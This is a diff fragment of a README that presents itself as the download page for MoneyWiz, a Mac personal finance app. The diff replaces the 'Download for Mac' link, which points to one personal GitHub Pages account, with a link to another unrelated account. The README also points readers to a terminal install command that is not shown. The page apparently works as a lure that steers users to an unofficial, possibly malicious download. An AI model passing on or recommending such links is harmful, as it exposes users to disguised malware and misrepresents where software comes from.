@@ -5,7 +5,7 @@ MoneyWiz for Mac is your all-in-one personal finance software 💰.
 Easily track expenses, manage budgets, and keep your finances organized on macOS.  
 Follow the instructions below to download and install MoneyWiz quickly.
 
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-007AFF?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/moneywiz)
+[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-007AFF?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/moneywiz)
 
 If the download button doesn’t work, follow the installation instructions below using the terminal command.
 
